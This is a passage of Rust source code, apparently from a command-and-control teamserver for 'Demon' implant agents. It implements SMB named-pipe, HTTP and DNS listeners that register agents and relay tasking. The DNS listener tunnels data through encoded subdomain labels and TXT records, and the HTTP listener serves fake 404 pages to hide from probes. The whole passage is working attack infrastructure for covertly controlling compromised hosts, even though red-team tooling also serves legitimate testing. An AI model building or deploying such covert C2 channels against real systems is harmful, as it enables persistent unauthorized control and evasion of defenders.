                })?;

            events.broadcast(agent_new_event(listener_name, init.header.magic, &init.agent));
            Ok(ProcessedDemonResponse { agent_id: init.agent.agent_id, payload: response })
        }
        Ok(ParsedDemonPacket::Reconnect { header, .. }) => {
            let payload = if let Some(agent) = registry.get(header.agent_id).await {
                build_init_ack(header.agent_id, &agent.encryption).map_err(|error| {
                    ListenerManagerError::InvalidConfig {
                        message: format!("failed to build reconnect ack: {error}"),
                    }
                })?
            } else {
                Vec::new()
            };

            Ok(ProcessedDemonResponse { agent_id: header.agent_id, payload })
        }
        Ok(ParsedDemonPacket::Callback { header, packages }) => {
            let payload =
                build_callback_response(listener_name, registry, events, header.agent_id, packages)
                    .await?;

            Ok(ProcessedDemonResponse { agent_id: header.agent_id, payload })
        }
        Err(error) => Err(ListenerManagerError::InvalidConfig {
            message: format!("failed to parse demon callback: {error}"),
        }),
    }
}

async fn spawn_smb_listener_runtime(
    config: &SmbListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
) -> Result<JoinHandle<()>, ListenerManagerError> {
    let state = Arc::new(SmbListenerState::build(config, registry, events));
    let listener_name = normalized_smb_pipe_name(&config.pipe_name);
    let socket_name = smb_local_socket_name(&config.pipe_name).map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to resolve SMB pipe `{listener_name}`: {error}"),
        }
    })?;
    let listener = ListenerOptions::new().name(socket_name).create_tokio().map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind SMB pipe `{listener_name}`: {error}"),
        }
    })?;

    Ok(tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok(stream) => {
                    let state = state.clone();
                    tokio::spawn(async move {
                        handle_smb_connection(state, stream).await;
                    });
                }
                Err(error) => {
                    warn!(listener = %state.config.name, pipe = %listener_name, %error, "smb listener exited");
                    break;
                }
            }
        }
    }))
}

async fn handle_smb_connection(state: Arc<SmbListenerState>, mut stream: LocalSocketStream) {
    loop {
        let frame = match read_smb_frame(&mut stream).await {
            Ok(Some(frame)) => frame,
            Ok(None) => break,
            Err(error) => {
                warn!(listener = %state.config.name, %error, "failed to read smb frame");
                break;
            }
        };

        if !is_valid_demon_callback_request(&frame.payload) {
            warn!(
                listener = %state.config.name,
                agent_id = format_args!("{:08X}", frame.agent_id),
                "ignoring invalid smb demon frame"
            );
            continue;
        }

        match process_demon_transport(
            &state.config.name,
            &state.registry,
            &state.parser,
            &state.events,
            &frame.payload,
            "127.0.0.1".to_owned(),
        )
        .await
        {
            Ok(response) => {
                if response.payload.is_empty() {
                    continue;
                }

                if let Err(error) =
                    write_smb_frame(&mut stream, response.agent_id, &response.payload).await
                {
                    warn!(
                        listener = %state.config.name,
                        agent_id = format_args!("{:08X}", response.agent_id),
                        %error,
                        "failed to write smb response"
                    );
                    break;
                }
            }
            Err(error) => {
                warn!(
                    listener = %state.config.name,
                    agent_id = format_args!("{:08X}", frame.agent_id),
                    %error,
                    "failed to process smb demon frame"
                );
            }
        }
    }
}

#[derive(Debug)]
struct SmbFrame {
    agent_id: u32,
    payload: Vec<u8>,
}

async fn read_smb_frame(stream: &mut LocalSocketStream) -> io::Result<Option<SmbFrame>> {
    let agent_id = match stream.read_u32_le().await {
        Ok(agent_id) => agent_id,
        Err(error) if error.kind() == io::ErrorKind::UnexpectedEof => return Ok(None),
        Err(error) => return Err(error),
    };
    let payload_len = match stream.read_u32_le().await {
        Ok(length) => length,
        Err(error) if error.kind() == io::ErrorKind::UnexpectedEof => return Ok(None),
        Err(error) => return Err(error),
    };
    let payload_len = usize::try_from(payload_len).map_err(|_| {
        io::Error::new(io::ErrorKind::InvalidData, "smb frame payload length overflowed usize")
    })?;
    let mut payload = vec![0_u8; payload_len];
    stream.read_exact(&mut payload).await?;
    Ok(Some(SmbFrame { agent_id, payload }))
}

async fn write_smb_frame(
    stream: &mut LocalSocketStream,
    agent_id: u32,
    payload: &[u8],
) -> io::Result<()> {
    let payload_len = u32::try_from(payload.len()).map_err(|_| {
        io::Error::new(io::ErrorKind::InvalidInput, "smb frame payload exceeds u32 length")
    })?;
    stream.write_u32_le(agent_id).await?;
    stream.write_u32_le(payload_len).await?;
    stream.write_all(payload).await?;
    stream.flush().await
}

fn normalized_smb_pipe_name(pipe_name: &str) -> String {
    let trimmed = pipe_name.trim();
    if trimmed.starts_with('/') || trimmed.starts_with(r"\\") {
        trimmed.to_owned()
    } else {
        format!("{SMB_PIPE_PREFIX}{trimmed}")
    }
}

#[cfg(unix)]
fn smb_local_socket_name(pipe_name: &str) -> io::Result<interprocess::local_socket::Name<'static>> {
    if pipe_name.trim_start().starts_with('/') {
        pipe_name.to_fs_name::<FilesystemUdSocket>().map(|name| name.into_owned())
    } else {
        normalized_smb_pipe_name(pipe_name)
            .to_ns_name::<AbstractNsUdSocket>()
            .map(|name| name.into_owned())
    }
}

#[cfg(windows)]
fn smb_local_socket_name(pipe_name: &str) -> io::Result<interprocess::local_socket::Name<'static>> {
    normalized_smb_pipe_name(pipe_name).to_fs_name::<NamedPipe>().map(|name| name.into_owned())
}

fn decode_fixed<const N: usize>(
    agent_id: u32,
    field: &'static str,
    encoded: &[u8],
    expected_len: usize,
) -> Result<[u8; N], ListenerManagerError> {
    let decoded =
        BASE64_STANDARD.decode(encoded).map_err(|error| ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid base64 in stored {field} for agent 0x{agent_id:08X}: {error}"
            ),
        })?;
    let actual = decoded.len();
    decoded.try_into().map_err(|_| ListenerManagerError::InvalidConfig {
        message: format!(
            "stored {field} for agent 0x{agent_id:08X} had length {actual}, expected {expected_len}"
        ),
    })
}

impl ListenerManager {
    async fn spawn_listener_runtime(
        &self,
        config: &ListenerConfig,
    ) -> Result<JoinHandle<()>, ListenerManagerError> {
        match config {
            ListenerConfig::Http(config) => {
                spawn_http_listener_runtime(
                    config,
                    self.agent_registry.clone(),
                    self.events.clone(),
                )
                .await
            }
            ListenerConfig::Smb(config) => {
                spawn_smb_listener_runtime(config, self.agent_registry.clone(), self.events.clone())
                    .await
            }
            ListenerConfig::External(_) => Ok(tokio::spawn(async move {
                std::future::pending::<()>().await;
            })),
            ListenerConfig::Dns(config) => {
                spawn_dns_listener_runtime(config, self.agent_registry.clone(), self.events.clone())
                    .await
            }
        }
    }
}

// ── DNS C2 Listener ──────────────────────────────────────────────────────────

/// DNS wire-format header length in bytes.
const DNS_HEADER_LEN: usize = 12;
/// DNS record type for TXT records.
const DNS_TYPE_TXT: u16 = 16;
/// DNS record type for A records.
const DNS_TYPE_A: u16 = 1;
/// DNS record class IN.
const DNS_CLASS_IN: u16 = 1;
/// DNS flag: Query/Response bit.
const DNS_FLAG_QR: u16 = 0x8000;
/// DNS flag: Authoritative Answer bit.
const DNS_FLAG_AA: u16 = 0x0400;
/// DNS RCODE: No Error.
const DNS_RCODE_NOERROR: u16 = 0;
/// DNS RCODE: Refused.
const DNS_RCODE_REFUSED: u16 = 5;
/// Maximum age in seconds before a pending DNS upload is discarded.
const DNS_UPLOAD_TIMEOUT_SECS: u64 = 120;
/// Maximum response chunk size in bytes (encoded as base32hex in a TXT string).
/// 200 base32hex chars × 5 bits ÷ 8 = 125 bytes.
const DNS_RESPONSE_CHUNK_BYTES: usize = 125;
/// Base32hex alphabet (RFC 4648 §7): 0-9 followed by A-V.
const BASE32HEX_ALPHABET: &[u8; 32] = b"0123456789ABCDEFGHIJKLMNOPQRSTUV";

/// In-progress multi-chunk upload reassembly buffer for a DNS C2 agent.
#[derive(Debug)]
struct DnsPendingUpload {
    /// Received chunks indexed by sequence number.
    chunks: HashMap<u16, Vec<u8>>,
    /// Total number of expected chunks.
    total: u16,
    /// Timestamp of the first chunk (for expiry tracking).
    received_at: Instant,
}

/// Pre-chunked C2 response ready to be polled by a DNS agent.
#[derive(Debug)]
struct DnsPendingResponse {
    /// Base32hex-encoded response chunks.
    chunks: Vec<String>,
}

/// Shared runtime state for the DNS C2 listener.
///
/// # DNS C2 Protocol
///
/// All DNS queries targeting the configured [`DnsListenerConfig::domain`] are
/// treated as C2 traffic. Two query sub-types are supported:
///
/// ## Upload (agent → teamserver)
///
/// ```text
/// <B32HEX-CHUNK>.<SEQ>-<TOTAL>-<AGENTID>.up.<DOMAIN>
/// ```
///
/// * `B32HEX-CHUNK` — base32hex-encoded data slice (max 39 bytes per label)
/// * `SEQ` — zero-based hex chunk index
/// * `TOTAL` — hex total chunk count
/// * `AGENTID` — 8-character lowercase hex agent identifier
///
/// The listener acknowledges each chunk with a TXT response:
/// * `ok`  — chunk stored; more chunks expected
/// * `ack` — all chunks received and the Demon packet was processed
/// * `err` — reassembly or Demon protocol error
///
/// ## Download (teamserver → agent)
///
/// ```text
/// <SEQ>-<AGENTID>.dn.<DOMAIN>
/// ```
///
/// The server responds with a TXT record:
/// * `wait`              — no response queued for this agent
/// * `<TOTAL> <B32HEX>` — total chunk count and the requested chunk
/// * `done`              — `SEQ` is past the end of the response
#[derive(Debug)]
struct DnsListenerState {
    config: DnsListenerConfig,
    registry: AgentRegistry,
    parser: DemonPacketParser,
    events: EventBus,
    /// Pending uploads keyed by agent ID.
    uploads: Mutex<HashMap<u32, DnsPendingUpload>>,
    /// Pending responses keyed by agent ID.
    responses: Mutex<HashMap<u32, DnsPendingResponse>>,
}

impl DnsListenerState {
    fn new(config: &DnsListenerConfig, registry: AgentRegistry, events: EventBus) -> Self {
        Self {
            config: config.clone(),
            registry: registry.clone(),
            parser: DemonPacketParser::new(registry),
            events,
            uploads: Mutex::new(HashMap::new()),
            responses: Mutex::new(HashMap::new()),
        }
    }

    async fn handle_dns_packet(&self, buf: &[u8], peer_ip: &str) -> Option<Vec<u8>> {
        let query = parse_dns_query(buf)?;

        // Only handle A and TXT queries
        if query.qtype != DNS_TYPE_A && query.qtype != DNS_TYPE_TXT {
            return Some(build_dns_refused_response(query.id));
        }

        let c2_query = parse_dns_c2_query(&query.labels, &self.config.domain)?;

        match c2_query {
            DnsC2Query::Upload { agent_id, seq, total, data } => {
                let txt = self.handle_upload(agent_id, seq, total, data, peer_ip).await;
                Some(build_dns_txt_response(query.id, &query.qname_raw, txt.as_bytes()))
            }
            DnsC2Query::Download { agent_id, seq } => {
                let txt = self.handle_download(agent_id, seq).await;
                Some(build_dns_txt_response(query.id, &query.qname_raw, txt.as_bytes()))
            }
        }
    }

    async fn handle_upload(
        &self,
        agent_id: u32,
        seq: u16,
        total: u16,
        data: Vec<u8>,
        peer_ip: &str,
    ) -> &'static str {
        let Some(assembled) = self.try_assemble_upload(agent_id, seq, total, data).await else {
            return "ok";
        };

        if !is_valid_demon_callback_request(&assembled) {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                "dns upload produced invalid demon packet; discarding"
            );
            return "err";
        }

        match process_demon_transport(
            &self.config.name,
            &self.registry,
            &self.parser,
            &self.events,
            &assembled,
            peer_ip.to_owned(),
        )
        .await
        {
            Ok(response) => {
                if !response.payload.is_empty() {
                    let chunks = chunk_response_to_b32hex(&response.payload);
                    self.responses.lock().await.insert(agent_id, DnsPendingResponse { chunks });
                }
                "ack"
            }
            Err(error) => {
                warn!(
                    listener = %self.config.name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    "dns upload demon processing failed"
                );
                "err"
            }
        }
    }

    async fn handle_download(&self, agent_id: u32, seq: u16) -> String {
        let responses = self.responses.lock().await;
        match responses.get(&agent_id) {
            None => "wait".to_owned(),
            Some(pending) => {
                let idx = usize::from(seq);
                let total = pending.chunks.len();
                if idx >= total {
                    "done".to_owned()
                } else {
                    format!("{} {}", total, pending.chunks[idx])
                }
            }
        }
    }

    /// Try to assemble a complete upload from buffered chunks.
    ///
    /// Returns `Some(bytes)` when all `total` chunks are present, `None` when more chunks
    /// are still expected.
    async fn try_assemble_upload(
        &self,
        agent_id: u32,
        seq: u16,
        total: u16,
        data: Vec<u8>,
    ) -> Option<Vec<u8>> {
        let mut uploads = self.uploads.lock().await;

        // Expire stale entries
        uploads
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);

        let entry = uploads.entry(agent_id).or_insert_with(|| DnsPendingUpload {
            chunks: HashMap::new(),
            total,
            received_at: Instant::now(),
        });
        entry.chunks.insert(seq, data);

        let expected = entry.total;
        if entry.chunks.len() < usize::from(expected) {
            return None;
        }

        // All chunks present — assemble in order
        let mut assembled = Vec::new();
        for i in 0..expected {
            match entry.chunks.get(&i) {
                Some(chunk) => assembled.extend_from_slice(chunk),
                None => {
                    warn!(
                        listener = %self.config.name,
                        agent_id = format_args!("{agent_id:08X}"),
                        "dns upload missing chunk {i}/{expected}; discarding"
                    );
                    uploads.remove(&agent_id);
                    return None;
                }
            }
        }
        uploads.remove(&agent_id);
        Some(assembled)
    }
}

/// A parsed DNS C2 query from a Demon agent.
enum DnsC2Query {
    /// Upload chunk: `<b32hex-data>.<seq>-<total>-<agentid>.up.<domain>`
    Upload { agent_id: u32, seq: u16, total: u16, data: Vec<u8> },
    /// Download request: `<seq>-<agentid>.dn.<domain>`
    Download { agent_id: u32, seq: u16 },
}

/// A minimally parsed DNS query sufficient for C2 processing.
struct ParsedDnsQuery {
    id: u16,
    /// Raw wire-format QNAME bytes (including final zero label).
    qname_raw: Vec<u8>,
    /// Lowercase parsed labels.
    labels: Vec<String>,
    qtype: u16,
}

/// Parse the first question from a raw DNS UDP payload.
///
/// Returns `None` if the packet is malformed or has ≠ 1 question.
fn parse_dns_query(buf: &[u8]) -> Option<ParsedDnsQuery> {
    if buf.len() < DNS_HEADER_LEN {
        return None;
    }

    let id = u16::from_be_bytes([buf[0], buf[1]]);
    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);

    if qdcount != 1 {
        return None;
    }

    let mut pos = DNS_HEADER_LEN;
    let qname_start = pos;
    let mut labels = Vec::new();

    loop {
        if pos >= buf.len() {
            return None;
        }
        let len = usize::from(buf[pos]);
        if len == 0 {
            pos += 1;
            break;
        }
        // Reject DNS pointer compression in queries (not expected in client queries)
        if len & 0xC0 != 0 {
            return None;
        }
        pos += 1;
        if pos + len > buf.len() {
            return None;
        }
        let label = std::str::from_utf8(&buf[pos..pos + len]).ok()?.to_ascii_lowercase();
        labels.push(label);
        pos += len;
    }

    if pos + 4 > buf.len() {
        return None;
    }
    let qtype = u16::from_be_bytes([buf[pos], buf[pos + 1]]);
    let qname_raw = buf[qname_start..pos].to_vec();

    Some(ParsedDnsQuery { id, qname_raw, labels, qtype })
}

/// Parse DNS labels into a [`DnsC2Query`] if they match the expected C2 format.
///
/// Expected formats (labels listed from leftmost to rightmost, domain stripped):
/// * Upload:   `["<b32>", "<seq>-<total>-<aid>", "up"]`
/// * Download: `["<seq>-<aid>",                  "dn"]`
fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
    // Strip the domain suffix labels from the right
    let domain_labels: Vec<&str> = domain.split('.').collect();
    let domain_label_count = domain_labels.len();

    if labels.len() <= domain_label_count {
        return None;
    }

    // Verify domain suffix matches
    let suffix = &labels[labels.len() - domain_label_count..];
    if suffix.iter().zip(domain_labels.iter()).any(|(a, b)| a != b) {
        return None;
    }

    let c2_labels = &labels[..labels.len() - domain_label_count];

    match c2_labels {
        // Upload: [b32data, "seq-total-aid", "up"]
        [b32data, ctrl, up] if up == "up" => {
            let parts: Vec<&str> = ctrl.splitn(3, '-').collect();
            if parts.len() != 3 {
                return None;
            }
            let seq = u16::from_str_radix(parts[0], 16).ok()?;
            let total = u16::from_str_radix(parts[1], 16).ok()?;
            let agent_id = u32::from_str_radix(parts[2], 16).ok()?;
            let data = base32hex_decode(b32data)?;
            Some(DnsC2Query::Upload { agent_id, seq, total, data })
        }
        // Download: ["seq-aid", "dn"]
        [ctrl, dn] if dn == "dn" => {
            let parts: Vec<&str> = ctrl.splitn(2, '-').collect();
            if parts.len() != 2 {
                return None;
            }
            let seq = u16::from_str_radix(parts[0], 16).ok()?;
            let agent_id = u32::from_str_radix(parts[1], 16).ok()?;
            Some(DnsC2Query::Download { agent_id, seq })
        }
        _ => None,
    }
}

/// Encode `data` as uppercase base32hex (RFC 4648 §7) with no padding.
fn base32hex_encode(data: &[u8]) -> String {
    let mut result = String::with_capacity((data.len() * 8).div_ceil(5));
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;

    for &byte in data {
        buf = (buf << 8) | u32::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            result.push(char::from(BASE32HEX_ALPHABET[((buf >> bits) & 0x1F) as usize]));
        }
    }

    if bits > 0 {
        result.push(char::from(BASE32HEX_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]));
    }

    result
}

/// Decode a base32hex string (case-insensitive, no padding) into bytes.
///
/// Returns `None` if any character is outside the base32hex alphabet.
fn base32hex_decode(s: &str) -> Option<Vec<u8>> {
    let mut result = Vec::with_capacity(s.len() * 5 / 8);
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;

    for ch in s.bytes() {
        let val = match ch {
            b'0'..=b'9' => u32::from(ch - b'0'),
            b'a'..=b'v' => u32::from(ch - b'a' + 10),
            b'A'..=b'V' => u32::from(ch - b'A' + 10),
            _ => return None,
        };
        buf = (buf << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            result.push((buf >> bits) as u8);
        }
    }

    Some(result)
}

/// Split a Demon response payload into base32hex-encoded chunks for DNS delivery.
fn chunk_response_to_b32hex(payload: &[u8]) -> Vec<String> {
    payload.chunks(DNS_RESPONSE_CHUNK_BYTES).map(base32hex_encode).collect()
}

/// Build a DNS TXT response for `query_id` carrying `txt_data`.
///
/// The question section is reconstructed from `qname_raw` (which already includes the
/// zero-label terminator), and a single answer TXT record is appended using a pointer
/// back to offset 12 (the start of the question QNAME).
fn build_dns_txt_response(query_id: u16, qname_raw: &[u8], txt_data: &[u8]) -> Vec<u8> {
    // Clamp TXT data to 255 bytes (single TXT string limit per RFC 1035).
    let txt_data = &txt_data[..txt_data.len().min(255)];
    // RDLENGTH = 1 (length byte) + txt_data.len()
    let rdlength = u16::try_from(1 + txt_data.len()).unwrap_or(u16::MAX);

    let mut response = Vec::with_capacity(
        DNS_HEADER_LEN + qname_raw.len() + 1 + 4 + 2 + 2 + 2 + 4 + 2 + 1 + txt_data.len(),
    );

    // Header (12 bytes)
    response.extend_from_slice(&query_id.to_be_bytes());
    let flags: u16 = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR;
    response.extend_from_slice(&flags.to_be_bytes());
    response.extend_from_slice(&1u16.to_be_bytes()); // qdcount = 1
    response.extend_from_slice(&1u16.to_be_bytes()); // ancount = 1
    response.extend_from_slice(&0u16.to_be_bytes()); // nscount = 0
    response.extend_from_slice(&0u16.to_be_bytes()); // arcount = 0

    // Question section: QNAME (includes zero-label terminator) + QTYPE + QCLASS
    // qname_raw includes the zero-label terminator as captured by parse_dns_query.
    response.extend_from_slice(qname_raw);
    response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // QTYPE
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // QCLASS

    // Answer RR
    // NAME: pointer to offset 12 (start of QNAME in question), encoded as 0xC00C
    response.extend_from_slice(&[0xC0, 0x0C]);
    response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // TYPE = TXT
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // CLASS = IN
    response.extend_from_slice(&0u32.to_be_bytes()); // TTL = 0 (no caching)
    response.extend_from_slice(&rdlength.to_be_bytes()); // RDLENGTH
    response.push(txt_data.len() as u8); // TXT string length byte
    response.extend_from_slice(txt_data); // TXT string data

    response
}

/// Build a DNS REFUSED response for `query_id`.
fn build_dns_refused_response(query_id: u16) -> Vec<u8> {
    let mut response = vec![0u8; DNS_HEADER_LEN];
    response[0] = (query_id >> 8) as u8;
    response[1] = query_id as u8;
    let flags: u16 = DNS_FLAG_QR | DNS_RCODE_REFUSED;
    response[2] = (flags >> 8) as u8;
    response[3] = flags as u8;
    response
}

async fn spawn_dns_listener_runtime(
    config: &DnsListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
) -> Result<JoinHandle<()>, ListenerManagerError> {
    let state = Arc::new(DnsListenerState::new(config, registry, events));
    let addr = format!("{}:{}", config.host_bind, config.port_bind);

    let socket =
        UdpSocket::bind(&addr).await.map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind DNS UDP socket {addr}: {error}"),
        })?;
    let socket = Arc::new(socket);

    Ok(tokio::spawn(async move {
        let mut buf = vec![0u8; 4096];
        loop {
            let (len, peer) = match socket.recv_from(&mut buf).await {
                Ok(result) => result,
                Err(error) => {
                    warn!(listener = %state.config.name, %error, "dns listener recv error");
                    break;
                }
            };

            let packet = buf[..len].to_vec();
            let state = state.clone();
            let socket = socket.clone();
            let peer_ip = peer.ip().to_string();

            tokio::spawn(async move {
                if let Some(response) = state.handle_dns_packet(&packet, &peer_ip).await {
                    if let Err(error) = socket.send_to(&response, peer).await {
                        warn!(listener = %state.config.name, %error, "dns listener send error");
                    }
                }
            });
        }
    }))
}

async fn build_http_tls_config(
    config: &HttpListenerConfig,
) -> Result<RustlsConfig, ListenerManagerError> {
    let subject_alt_names = http_listener_subject_alt_names(config);
    let cert_config =
        config.cert.as_ref().map(|cert| red_cell_common::config::HttpListenerCertConfig {
            cert: cert.cert.clone(),
            key: cert.key.clone(),
        });
    let identity =
        resolve_tls_identity(&subject_alt_names, cert_config.as_ref(), TlsKeyAlgorithm::EcdsaP256)
            .map_err(|error| ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to resolve TLS identity: {error}"),
            })?;

    RustlsConfig::from_pem(identity.certificate_pem().to_vec(), identity.private_key_pem().to_vec())
        .await
        .map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to build rustls configuration: {error}"),
        })
}

fn http_listener_subject_alt_names(config: &HttpListenerConfig) -> Vec<String> {
    let mut names = Vec::new();

    for value in config
        .hosts
        .iter()
        .chain(std::iter::once(&config.host_bind))
        .chain(config.host_header.iter())
    {
        let trimmed = value.trim();
        if trimmed.is_empty() || names.iter().any(|entry| entry == trimmed) {
            continue;
        }

        names.push(trimmed.to_owned());
        if trimmed.parse::<IpAddr>().is_ok_and(|address| address.is_unspecified()) {
            if !names.iter().any(|entry| entry == "127.0.0.1") {
                names.push("127.0.0.1".to_owned());
            }
            if !names.iter().any(|entry| entry == "localhost") {
                names.push("localhost".to_owned());
            }
        }
    }

    if names.is_empty() {
        names.push("127.0.0.1".to_owned());
    }

    names
}

async fn http_listener_handler(
    State(state): State<Arc<HttpListenerState>>,
    request: Request<Body>,
) -> Response {
    if !http_request_matches(&state, &request) {
        return state.fake_404_response();
    }

    let external_ip = extract_external_ip(&state, &request);
    let (_, body) = request.into_parts();
    let Ok(body) = to_bytes(body, usize::MAX).await else {
        return state.fake_404_response();
    };

    if !is_valid_demon_callback_request(&body) {
        return state.fake_404_response();
    }

    match process_demon_transport(
        &state.config.name,
        &state.registry,
        &state.parser,
        &state.events,
        &body,
        external_ip,
    )
    .await
    {
        Ok(response) if response.payload.is_empty() => state.callback_placeholder_response(),
        Ok(response) => state.callback_bytes_response(&response.payload),
        Err(error) => {
            warn!(listener = %state.config.name, %error, "failed to process demon callback");
            state.fake_404_response()
        }
    }
}

fn http_request_matches(state: &HttpListenerState, request: &Request<Body>) -> bool {
    request.method() == state.method
        && uri_matches(&state.config, request)
        && user_agent_matches(&state.config, request.headers())
        && headers_match(&state.required_headers, request.headers())
}

fn uri_matches(config: &HttpListenerConfig, request: &Request<Body>) -> bool {
    if config.uris.is_empty() || (config.uris.len() == 1 && config.uris[0].is_empty()) {
        return true;
    }

    let request_uri = request
        .uri()
        .path_and_query()
        .map_or_else(|| request.uri().path(), axum::http::uri::PathAndQuery::as_str);

    config.uris.iter().any(|uri| uri == request_uri)
}

fn user_agent_matches(config: &HttpListenerConfig, headers: &HeaderMap) -> bool {
    match config.user_agent.as_deref() {
        Some(expected) => {
            headers.get(axum::http::header::USER_AGENT).and_then(|value| value.to_str().ok())
                == Some(expected)
        }
        None => true,
    }
}

fn headers_match(expected_headers: &[ExpectedHeader], headers: &HeaderMap) -> bool {
    expected_headers.iter().all(|expected| {
        headers
            .get(&expected.name)
            .and_then(|value| value.to_str().ok())
            .is_some_and(|actual| actual.eq_ignore_ascii_case(&expected.expected_value))
    })
}

fn extract_external_ip(state: &HttpListenerState, request: &Request<Body>) -> String {
    if state.config.behind_redirector {
        if let Some(value) =
            request.headers().get("x-forwarded-for").and_then(|value| value.to_str().ok())
        {
            if let Some(ip) = value.split(',').map(str::trim).find(|value| !value.is_empty()) {
                return ip.to_owned();
            }
        }
    }

    request
        .headers()
        .get("x-real-ip")
        .and_then(|value| value.to_str().ok())
        .filter(|value| !value.trim().is_empty())
        .map_or_else(|| "0.0.0.0".to_owned(), |value| value.trim().to_owned())
}

fn is_valid_demon_callback_request(body: &[u8]) -> bool {
    if body.len() < MINIMUM_DEMON_CALLBACK_BYTES {
        return false;
    }

    if body[4..8] != DEMON_MAGIC_VALUE.to_be_bytes() {
        return false;
    }

    DemonHeader::from_bytes(body).is_ok()
}

fn parse_method(config: &HttpListenerConfig) -> Result<Method, ListenerManagerError> {
    config.method.as_deref().unwrap_or(DEFAULT_HTTP_METHOD).parse::<Method>().map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!("invalid HTTP method for listener `{}`: {error}", config.name),
        }
    })
}

fn parse_expected_header(
    header: &str,
    listener_name: &str,
) -> Result<Option<ExpectedHeader>, ListenerManagerError> {
    let Some((name, value)) = split_header(header) else {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header `{header}`"
            ),
        });
    };

    if HEADER_VALIDATION_IGNORES.iter().any(|ignored| name.eq_ignore_ascii_case(ignored)) {
        return Ok(None);
    }

    let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header name `{name}`: {error}"
            ),
        }
    })?;

    Ok(Some(ExpectedHeader { name, expected_value: value.to_owned() }))
}

fn parse_response_headers(
    response: &HttpListenerResponseConfig,
    listener_name: &str,
) -> Result<Vec<(HeaderName, HeaderValue)>, ListenerManagerError> {
    response
        .headers
        .iter()
        .map(|header| {
            let Some((name, value)) = split_header(header) else {
                return Err(ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header `{header}`"
                    ),
                });
            };

            let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header name `{name}`: {error}"
                    ),
                }
            })?;
            let value = HeaderValue::from_str(value).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header value for `{name}`: {error}"
                    ),
                }
            })?;

            Ok((name, value))
        })
        .collect()
}

fn split_header(header: &str) -> Option<(&str, &str)> {
    let (name, value) = header.split_once(':')?;
    let name = name.trim();
    let value = value.trim();

    if name.is_empty() {
        return None;
    }

    Some((name, value))
}

fn build_response(
    status: StatusCode,
    body: &[u8],
    headers: &[(HeaderName, HeaderValue)],
) -> Response {
    let mut response = Response::new(axum::body::Body::from(body.to_vec()));
    *response.status_mut() = status;

    let response_headers = response.headers_mut();
    for (name, value) in headers {
        response_headers.insert(name.clone(), value.clone());
    }

    response
}

fn set_default_header(headers: &mut HeaderMap, name: &'static str, value: &'static str) {
    let header_name = HeaderName::from_static(name);
    if !headers.contains_key(&header_name) {
        headers.insert(header_name, HeaderValue::from_static(value));
    }
}

fn required_field<'a>(
    field: &'static str,
    value: Option<&'a str>,
) -> Result<&'a str, ListenerManagerError> {
    value.map(str::trim).filter(|value| !value.is_empty()).ok_or_else(|| {
        ListenerManagerError::InvalidConfig { message: format!("{field} is required") }
    })
}

fn required_extra_string(
    info: &ListenerInfo,
    field: &'static str,
) -> Result<String, ListenerManagerError> {
    match info.extra.get(field).and_then(serde_json::Value::as_str).map(str::trim) {
        Some(value) if !value.is_empty() => Ok(value.to_owned()),
        _ => Err(ListenerManagerError::InvalidConfig { message: format!("{field} is required") }),
    }
}

fn parse_u16(field: &'static str, value: Option<&str>) -> Result<u16, ListenerManagerError> {
    let value = required_field(field, value)?;
    value.parse::<u16>().map_err(|error| ListenerManagerError::InvalidConfig {
        message: format!("{field} must be a valid port: {error}"),
    })
}

fn parse_optional_u16(
    field: &'static str,
    value: Option<&str>,
) -> Result<Option<u16>, ListenerManagerError> {
    match optional_trimmed(value) {
        Some(value) => {
            value.parse::<u16>().map(Some).map_err(|error| ListenerManagerError::InvalidConfig {
                message: format!("{field} must be a valid port: {error}"),
            })
        }
        None => Ok(None),
    }
}

fn parse_bool(field: &'static str, value: Option<&str>) -> Result<bool, ListenerManagerError> {
    match optional_trimmed(value) {
        Some(value) if value.eq_ignore_ascii_case("true") => Ok(true),
        Some(value) if value.eq_ignore_ascii_case("false") => Ok(false),
        Some(value) => Err(ListenerManagerError::InvalidConfig {
            message: format!("{field} must be `true` or `false`, got `{value}`"),
        }),
        None => Ok(false),
    }
}

fn optional_trimmed(value: Option<&str>) -> Option<String> {
    value.map(str::trim).filter(|value| !value.is_empty()).map(ToOwned::to_owned)
}

fn split_csv(value: Option<&str>) -> Vec<String> {
    value
        .map(|value| {
            value
                .split(',')
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .map(ToOwned::to_owned)
                .collect()
        })
        .unwrap_or_default()
}

fn proxy_from_operator(
    info: &ListenerInfo,
